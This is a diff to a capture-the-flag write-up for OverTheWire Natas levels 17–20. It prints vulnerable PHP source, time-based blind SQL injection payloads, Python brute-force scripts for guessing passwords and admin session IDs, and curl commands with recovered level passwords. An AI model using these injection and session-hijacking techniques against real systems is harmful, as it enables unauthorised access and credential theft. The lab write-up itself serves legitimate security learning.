@@ -749,7 +749,7 @@ for i in range(100):
     uri = '{}?username=natas16%22+and+length(password)+=+%22{}'.format(url, i)
     r = requests.get(uri, auth=(auth_username,auth_password))
     if 'This user exists.' in r.text:
-        length = 32
+        length = i
         print('password length:', i)
         break
 
@@ -914,3 +914,453 @@ password: 8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw
 
 ### natas17
 
+```php
+<?
+
+/*
+CREATE TABLE `users` (
+  `username` varchar(64) DEFAULT NULL,
+  `password` varchar(64) DEFAULT NULL
+);
+*/
+
+if(array_key_exists("username", $_REQUEST)) {
+    $link = mysql_connect('localhost', 'natas17', '<censored>');
+    mysql_select_db('natas17', $link);
+    
+    $query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+    if(array_key_exists("debug", $_GET)) {
+        echo "Executing query: $query<br>";
+    }
+
+    $res = mysql_query($query, $link);
+    if($res) {
+    if(mysql_num_rows($res) > 0) {
+        //echo "This user exists.<br>";
+    } else {
+        //echo "This user doesn't exist.<br>";
+    }
+    } else {
+        //echo "Error in query.<br>";
+    }
+
+    mysql_close($link);
+} else {
+?> 
+```
+
+This is blind SQL injection, we don't know about information of response in browser. So we will try blind SQL injection with time delays.
+
+Step 1: Test payload
+
+```
+username=natas18%22+and+sleep(3)%23 -> time response=3 -> user natas18 exists.
+```
+
+Step 2: Brute-force length password
+
+```
+username=natas18%22+and+length(password)%3d§32§+and+sleep(3)%23 -> Length password = 32.
+```
+
+Step 3: Brute-force password char by char
+
+```
+username=natas18%22+and+substring(password,§1§,1)+like+binary+%22§a§%22+and+sleep(3)%23 -> 
+```
+
+This following python code `solve.py`:
+
+```python
+#!/usr/bin/python3
+import requests
+from string import ascii_letters, digits
+
+url = "http://natas17.natas.labs.overthewire.org/index.php"
+auth_username = "natas17"
+auth_password = "8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw"
+
+# brute-force length
+for i in range(100):
+    uri = '{}?username=natas18%22+and+length(password)%3d{}+and+sleep(3)%23'.format(url, i)
+    r = requests.get(uri, auth=(auth_username,auth_password))
+    if r.elapsed.total_seconds() > 3:
+        length = i
+        print('password length:', i)
+        break
+
+characters = ascii_letters + digits
+print('characters:', characters)
+
+# brute-force char
+password = ''
+for i in range(length):
+    for char in characters:
+        uri = '{}?username=natas18%22+and+substring(password,{},1)+like+binary+%22{}%22+and+sleep(3)%23'.format(url, i+1, char)
+        r = requests.get(uri, auth=(auth_username,auth_password))
+        if r.elapsed.total_seconds() > 3:
+            password += char
+            print('password:', password)
+            break
+```
+
+```
+python3 solve.py
+
+('password length:', 32)
+('characters:', 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789')
+('password:', 'x')
+('password:', 'xv')
+('password:', 'xvK')
+('password:', 'xvKI')
+('password:', 'xvKIq')
+('password:', 'xvKIqD')
+('password:', 'xvKIqDj')
+('password:', 'xvKIqDjy')
+('password:', 'xvKIqDjy4')
+('password:', 'xvKIqDjy4O')
+('password:', 'xvKIqDjy4OP')
+('password:', 'xvKIqDjy4OPv')
+('password:', 'xvKIqDjy4OPv7')
+('password:', 'xvKIqDjy4OPv7w')
+('password:', 'xvKIqDjy4OPv7wC')
+('password:', 'xvKIqDjy4OPv7wCR')
+('password:', 'xvKIqDjy4OPv7wCRg')
+('password:', 'xvKIqDjy4OPv7wCRgD')
+('password:', 'xvKIqDjy4OPv7wCRgDl')
+('password:', 'xvKIqDjy4OPv7wCRgDlm')
+('password:', 'xvKIqDjy4OPv7wCRgDlmj')
+('password:', 'xvKIqDjy4OPv7wCRgDlmj0')
+('password:', 'xvKIqDjy4OPv7wCRgDlmj0p')
+('password:', 'xvKIqDjy4OPv7wCRgDlmj0pF')
+('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFs')
+('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFsC')
+('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFsCs')
+('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsD')
+('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDj')
+('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjh')
+('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhd')
+('password:', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')
+```
+
+### natas18
+
+```php
+<?
+
+$maxid = 640; // 640 should be enough for everyone
+
+function isValidAdminLogin() { /* {{{ */
+    if($_REQUEST["username"] == "admin") {
+    /* This method of authentication appears to be unsafe and has been disabled for now. */
+        //return 1;
+    }
+
+    return 0;
+}
+/* }}} */
+function isValidID($id) { /* {{{ */
+    return is_numeric($id);
+}
+/* }}} */
+function createID($user) { /* {{{ */
+    global $maxid;
+    return rand(1, $maxid);
+}
+/* }}} */
+function debug($msg) { /* {{{ */
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+/* }}} */
+function my_session_start() { /* {{{ */
+    if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {
+    if(!session_start()) {
+        debug("Session start failed");
+        return false;
+    } else {
+        debug("Session start ok");
+        if(!array_key_exists("admin", $_SESSION)) {
+        debug("Session was old: admin flag set");
+        $_SESSION["admin"] = 0; // backwards compatible, secure
+        }
+        return true;
+    }
+    }
+
+    return false;
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas19\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";
+    }
+}
+/* }}} */
+
+$showform = true;
+if(my_session_start()) {
+    print_credentials();
+    $showform = false;
+} else {
+    if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {
+    session_id(createID($_REQUEST["username"]));
+    session_start();
+    $_SESSION["admin"] = isValidAdminLogin();
+    debug("New session started");
+    $showform = false;
+    print_credentials();
+    }
+} 
+
+if($showform) {
+?>
+
+<p>
+Please login with your admin account to retrieve credentials for natas19.
+</p>
+
+<form action="index.php" method="POST">
+Username: <input name="username"><br>
+Password: <input name="password"><br>
+<input type="submit" value="Login" />
+</form>
+<? } ?> 
+```
+
+When login with any username and password, we can see the response:
+
+```
+POST /index.php HTTP/1.1
+Host: natas18.natas.labs.overthewire.org
+Content-Length: 27
+Cache-Control: max-age=0
+Authorization: Basic bmF0YXMxODp4dktJcURqeTRPUHY3d0NSZ0RsbWowcEZzQ3NEamhkUA==
+Upgrade-Insecure-Requests: 1
+Origin: http://natas18.natas.labs.overthewire.org
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://natas18.natas.labs.overthewire.org/
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q=0.9
+Cookie: PHPSESSID=273
+Connection: close
+
+username=test&password=test
+```
+
+The random session was created, and `PHPSESSID=273` is set in cookie. Because the maximum of `PHPSESSID` is `640`. So we can brute-force 640 times to find the PHPSESSID of admin. This following python code `solve.py`: 
+
+```python
+import requests
+
+url = "http://natas18.natas.labs.overthewire.org/"
+auth_username = "natas18"
+auth_password = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
+
+for i in range(641):
+    r = requests.get(url, auth=(auth_username, auth_password), cookies={'PHPSESSID': str(i)})
+    if i == 0:
+        request_length = len(r.content)
+    if len(r.content) != request_length:
+        print('admin id:', i)
+        break
+    request_length = len(r.content)
+```
+
+```
+python3 solve.py
+
+('admin id:', 119)
+```
+
+Using `curl` to set cookie `PHPSESSID=119`:
+
+```shell
+curl --user natas18:xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP http://natas18.natas.labs.overthewire.org/ --cookie "PHPSESSID=119"
+```
+
+```
+You are an admin. The credentials for the next level are:<br><pre>Username: natas19
+Password: 4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs</pre><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
+```
+
+### natas19
+
+```
+This page uses mostly the same code as the previous level, but session IDs are no longer sequential... 
+```
+
+So we explore the cookie `PHPSESSID` in the response with username=hoangp46&password=123456
+
+POST /index.php HTTP/1.1
+Host: natas19.natas.labs.overthewire.org
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://natas19.natas.labs.overthewire.org/index.php?debug=1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 33
+Origin: http://natas19.natas.labs.overthewire.org
+Authorization: Basic bmF0YXMxOTo0SXdJcmVrY3VabEE5T3NqT2tvVXR3VTZsaG9rQ1BZcw==
+Connection: keep-alive
+Cookie: __utma=176859643.1954634464.1645363414.1646410345.1646492867.10; __utmz=176859643.1646492867.10.6.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); PHPSESSID=3237332d686f616e67703436
+Upgrade-Insecure-Requests: 1
+Cache-Control: max-age=0
+
+The cookie `PHPSESSID=3237332d686f616e67703436` look like HEX format, try decode it we get `273-hoangp46` -> now we can brute-force to find the PHPSESSID of admin with payload `HEX(§640§-admin)`. This following python code `solve.py`:
+
+```python
+import requests
+
+url = "http://natas19.natas.labs.overthewire.org"
+auth_username = "natas19"
+auth_password = "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"
+
+for i in range(641):
+    cookie = '{}-admin'.format(i).encode().hex()
+    r = requests.get(url, auth=(auth_username, auth_password), cookies={'PHPSESSID': cookie})
+    if i == 0:
+        request_length = len(r.content)
+    if len(r.content) != request_length:
+        print('admin id:', i, 'cookie:', cookie)
+        break
+    request_length = len(r.content)
+```
+
+```
+python3 solve.py
+
+admin id: 281 cookie: 3238312d61646d696e
+```
+
+Using `curl` to set cookie `PHPSESSID=3238312d61646d696e`:
+
+```shell
+curl --user natas19:4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs http://natas19.natas.labs.overthewire.org --cookie "PHPSESSID=3238312d61646d696e"
+```
+
+```
+You are an admin. The credentials for the next level are:<br><pre>Username: natas20
+Password: eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF</pre></div>
+```
+
+### natas20
+
+```php
+<?
+
+function debug($msg) { /* {{{ */
+    if(array_key_exists("debug", $_GET)) {
+        print "DEBUG: $msg<br>";
+    }
+}
+/* }}} */
+function print_credentials() { /* {{{ */
+    if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
+    print "You are an admin. The credentials for the next level are:<br>";
+    print "<pre>Username: natas21\n";
+    print "Password: <censored></pre>";
+    } else {
+    print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";
+    }
+}
+/* }}} */
+
+/* we don't need this */
+function myopen($path, $name) { 
+    //debug("MYOPEN $path $name"); 
+    return true; 
+}
+
+/* we don't need this */
+function myclose() { 
+    //debug("MYCLOSE"); 
+    return true; 
+}
+
+function myread($sid) { 
+    debug("MYREAD $sid"); 
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID"); 
+        return "";
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    if(!file_exists($filename)) {
+        debug("Session file doesn't exist");
+        return "";
+    }
+    debug("Reading from ". $filename);
+    $data = file_get_contents($filename);
+    $_SESSION = array();
+    foreach(explode("\n", $data) as $line) {
+        debug("Read [$line]");
+    $parts = explode(" ", $line, 2);
+    if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];
+    }
+    return session_encode();
+}
+
+function mywrite($sid, $data) { 
+    // $data contains the serialized version of $_SESSION
+    // but our encoding is better
+    debug("MYWRITE $sid $data"); 
+    // make sure the sid is alnum only!!
+    if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {
+    debug("Invalid SID"); 
+        return;
+    }
+    $filename = session_save_path() . "/" . "mysess_" . $sid;
+    $data = "";
+    debug("Saving in ". $filename);
+    ksort($_SESSION);
+    foreach($_SESSION as $key => $value) {
+        debug("$key => $value");
+        $data .= "$key $value\n";
+    }
+    file_put_contents($filename, $data);
+    chmod($filename, 0600);
+}
+
+/* we don't need this */
+function mydestroy($sid) {
+    //debug("MYDESTROY $sid"); 
+    return true; 
+}
+/* we don't need this */
+function mygarbage($t) { 
+    //debug("MYGARBAGE $t"); 
+    return true; 
+}
+
+session_set_save_handler(
+    "myopen", 
+    "myclose", 
+    "myread", 
+    "mywrite", 
+    "mydestroy", 
+    "mygarbage");
+session_start();
+
+if(array_key_exists("name", $_REQUEST)) {
+    $_SESSION["name"] = $_REQUEST["name"];
+    debug("Name set to " . $_REQUEST["name"]);
+}
+
+print_credentials();
+
+$name = "";
+if(array_key_exists("name", $_SESSION)) {
+    $name = $_SESSION["name"];
+}
+
+?>
+
+```
